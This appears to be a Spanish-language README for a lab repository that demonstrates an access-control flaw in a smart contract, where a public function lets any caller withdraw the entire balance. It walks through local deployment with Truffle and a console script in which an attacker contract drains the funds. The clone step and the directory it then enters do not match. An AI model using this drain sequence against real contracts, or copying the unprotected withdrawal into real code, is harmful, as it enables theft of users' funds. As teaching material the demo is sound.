Explicación de la vulnerabilidad
La vulnerabilidad radica en la función exploitWithdraw que es pública, permitiendo que cualquiera llame a la función withdrawFunds, que transfiere todo el balance del contrato al msg.sender sin ninguna verificación adicional.

Guía para Crear y Probar la Vulnerabilidad
1. Clonar el repositorio:

  En primer lugar, asegúrate de tener instalado git y node.js. Luego, clona tu repositorio:
  bash: 
  git clone https://github.com/Yovanys-tm/ContratoVulnerable.git  
  cd vulnerable-smart-contract

2. Instalar dependencias:
  Asegúrate de tener Truffle o Hardhat instalado. Si no, puedes instalarlo con:
  bash: 
  npm install -g truffle # O hardhat

  Después, instala las dependencias locales del proyecto:
  bash: 
  npm install

3. Desplegar contratos:
  Para compilar y desplegar los contratos, sigue estos pasos:

  En truffle-config.js o hardhat.config.js, configura la red local.

  Despliega el contrato vulnerable:
  bash : 
  truffle migrate --reset

4. Interactuar con los contratos:
  Una vez que los contratos estén desplegados, puedes interactuar con ellos usando la consola de Truffle:
  bash : 
  truffle console

  En la consola, realiza los siguientes pasos para simular el ataque:
  javascript
  // Asigna la dirección del contrato vulnerable
  let vulnerable = await VulnerableContract.deployed();

  // Deposita ETH en el contrato vulnerable
  await vulnerable.deposit({from: accounts[0], value: web3.utils.toWei('1', 'ether')});

  // Despliega el contrato atacante
  let attacker = await Attacker.new(vulnerable.address);

  // Ejecuta el ataque
  await attacker.attack({from: accounts[1]});

  // Verifica que los fondos han sido retirados
  let newBalance = await vulnerable.balance();
  console.log("Balance del contrato vulnerable después del ataque:", newBalance.toString());

